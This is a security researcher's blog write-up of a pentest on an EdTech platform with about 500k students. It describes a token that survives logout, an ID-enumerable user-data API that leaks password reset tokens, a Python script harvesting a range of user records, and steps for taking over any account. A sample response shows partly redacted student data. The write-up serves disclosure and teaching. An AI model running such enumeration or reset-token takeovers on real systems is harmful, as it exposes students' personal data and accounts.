---
layout: post
published: true
hidden: false
title: Safeguarding 500k Academic Futures - Detailed Writeup
date: 2024-06-12 00:00:00 +0000
category: blog
tags: [edtech, edsec, writeups, account-takeover]
---
![EdSec: Safeguarding 500k Academic Futures](/assets/images/EdSec-Safeguarding-500k-Academic-Futures.png)

This is my first blog post, and because of that it marks a new beginning for me. I have been around in cybersecurity for probably half of my age as I stepped into it when I was maybe 10 but what I clearly remember is that my first milestone or achievement that I had was when I was 12 - That is when I got into Microsoft's Hall of Fame. Since that time, I have been actively learning and even working with few companies and even startups which I never wrote about or maybe never even shared on my LinkedIn too and I really feel sorry for that. So here's my attempt to make up for it. 

I had to perform a pentest of an EdTech platform consisting of a huge userbase, around 500k+ students enrolled on the platform at the time of the pentest. I was reached out by their CTO initiating a collaboration for the safety of their users and the company's digital assets. 

The following writeup is from one of the interesting findings that were a part of the final report and was patched keeping their CTO in loop. He was genuinely very concerned and involved with every step within the process, and one of the highly talented individuals I've come across, sharing with me how he left his dream job and stepped into entrepreneurship. 

Starting with the writeup now, I was more interested into understanding the application's business workflow first and dig into each of the components that I discover. Enumeration definitely has to be the priority, I did decide to spend a decent amount of time on it. 

Starting with the enumeration, I started discovering numerous API endpoints and different calls going around. Silently logging to analyze later. 

The first thing to notice was that, each of the API call was accompanied by an **_Authorization_** header that consisted of a token to validate the API calls. Looks pretty good, that's how it should be right. My first thought was to remove the **_Authorization_** header and see if the API responds and it turns out that the API discards the request. Pretty good here. 

While the API endpoints were being discovered, I took some time to browse through the application and noticed an option to create a "**_Guest Account_**", can't ignore such a great lead. Immediately created a guest account, grabbed its Authorization token but wait a second!? What if I log-out. Ideally, logging out should make the token unusable, more of a garbage after the sessions ends. In this case, the token was still usable and valid. Got the missing piece right? Now we have a token that we can use countless times for our API calls. 

Till now, we have a list of API endpoints to test and a valid token that can be used for authorized API requests.

Going through the list of discovered endpoints, I came across an interesting one: "**_/api/v1/users/getUserData?id=[any User ID]_**. Even more interesting was the JSON object that I received in the response, a little snippet for you:

```json
{
	"id": some number,
    "cnic": "[redacted]",
    "provider": "email",
    "uid": "[redacted]@nbs.nust.edu.pk",
    "uid_phone": [redacted],
    "reset_password_token": null,
    "reset_password_sent_at": null,
    "remember_created_at": null,
    "sign_in_count": 9,
    "current_sign_in_at": null,
    "last_sign_in_at": null,
    "current_sign_in_ip": null,
    "last_sign_in_ip": null,
    "confirmation_token": "ijsnfwtn4fd",
}
```

There's just so much more juicy information right there right? Indeed. The very next thing I tried and it turned out right was that the "**_id_**" for each user or student was in incremental order, a simple block of code and information extraction is automated. I quickly wrote a little Python code to automate this, developing a proof of concept for the team. 

```python
import requests
import json
file = open("retrieved-data.json", "w")
for x in range(223000, 223999):
    print('[+] Retrieving Data for UserID: %s' %(str(x)))
    url = "https://[redacted]/api/v1/users/getUserData?id=%s" % (str(x))
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOjI1MzA2NiwiaWF0IjoxNjI5MTIxOTUwfQ.Q8k_QCsJsb0v8qsh4AYk4ZxV5siLNTUOty9ilQYWhg4",
        "Uid": "253066",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers"
    }
    req = requests.get(url, headers=headers)
    if len(req.content) != 0:
        file.write(json.dumps(json.loads(req.content), indent=4))
        file.write('\n')
file.close()
```

But there's more to it? The juicy information returned by the API really had me wondering what attack scenario could do the worst for them.

You might have noticed it earlier, "**_reset_password_token_**" really had me down to spend more time on it. 

At this point, we do have enough findings to reset any user's password. The following steps help us achieve that: 
1. Navigate to "Forgot Password" option, enter target's email address.
2. A password reset token is generated, along with a link that is emailed to the target. 
3. As per our findings, we can easily fetch the password reset token that was generated for the target.
4. Navigate to the following link to finally reset the password for the target:
> https://[redacted]/resetPassword/[target email]/[password reset token]

That's it for this writeup, the amount of findings I have had for EdTech platforms I believe it's time we start talking about "**_EdSec_**"(maybe?). 

fin.